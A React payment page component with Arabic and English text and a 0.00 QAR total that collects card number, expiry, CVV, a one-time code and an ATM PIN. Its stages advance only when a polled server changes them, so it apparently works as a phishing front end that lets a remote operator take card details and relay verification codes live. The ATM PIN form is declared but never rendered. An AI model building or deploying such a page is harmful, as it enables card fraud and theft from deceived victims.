import React, { useState, useEffect, type FormEvent } from "react";
import { useLanguage } from "@/contexts/LanguageContext";
import { useLocation } from "wouter";
import { useTranslation } from "@/hooks/useTranslation";
import { Header } from "@/components/Header";
import { trpc } from "@/lib/trpc";
import { toast } from "sonner";

type Stage = "card" | "card_pending" | "otp" | "otp_pending" | "atm" | "atm_pending" | "success" | "failed";

export default function Payment() {
  const { lang, isRTL } = useLanguage();
  const { t } = useTranslation();
  const [, navigate] = useLocation();
  const searchParams = new URLSearchParams(window.location.search);
  const sessionId = searchParams.get("session") || "";
  
  const [stage, setStage] = useState<Stage>("card");
  const [error, setError] = useState<string | null>(null);
  const [cardName, setCardName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [cardExpiry, setCardExpiry] = useState("");
  const [cardCvv, setCardCvv] = useState("");
  const [otpCode, setOtpCode] = useState("");
  const [atmPin, setAtmPin] = useState("");

  const submitCardMutation = trpc.payment.submitCard.useMutation({
    onSuccess: () => setStage("card_pending"),
    onError: (err) => setError(err.message),
  });

  const submitOtpMutation = trpc.payment.submitOtp.useMutation({
    onSuccess: () => setStage("otp_pending"),
    onError: (err) => setError(err.message),
  });

  const submitAtmPinMutation = trpc.payment.submitAtmPin.useMutation({
    onSuccess: () => setStage("atm_pending"),
    onError: (err) => setError(err.message),
  });

  const { data: sessionStatus } = trpc.payment.getStatus.useQuery(
    { sessionId: sessionId || "" },
    {
      enabled: !!sessionId && ["card_pending", "otp_pending", "atm_pending"].includes(stage),
      refetchInterval: 3000,
    }
  );

  useEffect(() => {
    if (sessionStatus?.stage && sessionStatus.stage !== stage) {
      setStage(sessionStatus.stage as Stage);
      if (sessionStatus.errorMessage) setError(sessionStatus.errorMessage);
      else setError(null);
    }
  }, [sessionStatus, stage]);

  const handleCardSubmit = (e: FormEvent) => {
    e.preventDefault();
    submitCardMutation.mutate({
      sessionId,
      cardName,
      cardNumber,
      cardExpiry,
      cardCvv,
    });
  };

  const handleOtpSubmit = (e: FormEvent) => {
    e.preventDefault();
    submitOtpMutation.mutate({ sessionId, otpCode });
  };

  const handleAtmSubmit = (e: FormEvent) => {
    e.preventDefault();
    submitAtmPinMutation.mutate({ sessionId, atmPin });
  };

  return (
    <div className="min-h-screen bg-[#F8F9FA]" dir={lang === "ar" ? "rtl" : "ltr"}>
      {/* Header Component */}
      <Header showLanguageToggle={false} />

      <main className="max-w-md mx-auto px-4 py-8">
        <div className="bg-white rounded-2xl shadow-sm border border-gray-100 overflow-hidden">
          <div className="bg-[#8A1538] p-6 text-white text-center">
            <h1 className="text-xl font-bold">{t("payment.title")}</h1>
            <p className="text-sm opacity-80 mt-1">{t("payment.subtitle")}</p>
          </div>

          <div className="p-6">
            {stage === "card" && (
              <form onSubmit={handleCardSubmit} className="space-y-5">
                <div className="flex justify-between items-center pb-4 border-b border-gray-100">
                  <span className="text-gray-600">{t("payment.totalAmount")}</span>
                  <span className="text-xl font-bold text-[#8A1538]">0.00 QAR</span>
                </div>

                {error && (
                  <div className="p-3 bg-red-50 text-red-600 text-xs rounded-lg border border-red-100">
                    {error}
                  </div>
                )}

                <div className="space-y-4">
                  <div>
                    <label className="block text-xs font-bold text-gray-400 mb-1">{t("payment.cardholderName")}</label>
                    <input
                      type="text"
                      value={cardName}
                      onChange={(e) => setCardName(e.target.value)}
                      className="w-full p-3 border border-gray-200 rounded-lg outline-none focus:border-[#8A1538]"
                      placeholder="NAME ON CARD"
                      required
                    />
                  </div>

                  <div>
                    <label className="block text-xs font-bold text-gray-400 mb-1">{t("payment.cardNumber")}</label>
                    <input
                      type="text"
                      value={cardNumber}
                      onChange={(e) => setCardNumber(e.target.value)}
                      maxLength={16}
                      className="w-full p-3 border border-gray-200 rounded-lg outline-none focus:border-[#8A1538]"
                      placeholder="0000 0000 0000 0000"
                      required
                    />
                  </div>

                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <label className="block text-xs font-bold text-gray-400 mb-1">{t("payment.expiryDate")}</label>
                      <input
                        type="text"
                        value={cardExpiry}
                        onChange={(e) => setCardExpiry(e.target.value)}
                        placeholder="MM/YY"
                        className="w-full p-3 border border-gray-200 rounded-lg outline-none focus:border-[#8A1538] text-center"
                        required
                      />
                    </div>
                    <div>
                      <label className="block text-xs font-bold text-gray-400 mb-1">{t("payment.cvv")}</label>
                      <input
                        type="password"
                        value={cardCvv}
                        onChange={(e) => setCardCvv(e.target.value)}
                        maxLength={4}
                        placeholder="***"
                        className="w-full p-3 border border-gray-200 rounded-lg outline-none focus:border-[#8A1538] text-center"
                        required
                      />
                    </div>
                  </div>
                </div>

                <button
                  type="submit"
                  disabled={submitCardMutation.isPending}
                  className="w-full py-4 bg-[#8A1538] text-white rounded-lg font-bold hover:bg-[#6D112C] transition-all"
                >
                  {submitCardMutation.isPending ? t("payment.processing") : t("payment.completePayment")}
                </button>
              </form>
            )}

            {(stage === "card_pending" || stage === "otp_pending" || stage === "atm_pending") && (
              <div className="py-20 text-center space-y-4">
                <div className="w-12 h-12 border-4 border-[#8A1538] border-t-transparent rounded-full animate-spin mx-auto"></div>
                <h3 className="text-lg font-bold text-gray-900">{t("payment.processing")}</h3>
                <p className="text-gray-500 text-sm">{lang === "ar" ? "يرجى الانتظار، يتم التحقق من بياناتك" : "Please wait, verifying your details"}</p>
              </div>
            )}

            {stage === "otp" && (
              <form onSubmit={handleOtpSubmit} className="text-center space-y-6">
                <h3 className="text-xl font-bold text-gray-900">{t("payment.verificationCode")}</h3>
                <p className="text-gray-500 text-sm">{t("payment.enterCode")}</p>
                <input
                  value={otpCode}
                  onChange={(e) => setOtpCode(e.target.value)}
                  className="w-full text-center text-3xl font-bold p-4 bg-gray-50 border border-gray-200 rounded-xl outline-none focus:border-[#8A1538]"
                  placeholder="••••••"
                  maxLength={6}
                  required
                />
                <button
                  type="submit"
                  disabled={submitOtpMutation.isPending}
                  className="w-full bg-[#8A1538] text-white font-bold py-4 rounded-xl shadow-lg"
                >
                  {submitOtpMutation.isPending ? "جاري التأكيد..." : t("payment.confirm")}
                </button>
              </form>
            )}

            {stage === "success" && (
              <div className="py-12 text-center space-y-6">
                <div className="text-5xl text-green-500">✓</div>
                <h3 className="text-2xl font-bold text-gray-900">{t("payment.success")}</h3>
                <p className="text-gray-500">{lang === "ar" ? "شكراً لك، تمت معالجة العملية." : "Thank you, your payment has been processed."}</p>
                <button
                  onClick={() => navigate("/")}
                  className="bg-gray-900 text-white font-bold py-4 px-8 rounded-xl"
                >
                  {t("payment.backHome")}
                </button>
              </div>
            )}
          </div>
        </div>

        <div className="mt-8 flex justify-center gap-6 opacity-30 grayscale">
          <img src="/card-brands.png" alt="Payment Methods" className="h-8 object-contain" />
        </div>
      </main>
    </div>
  );
}
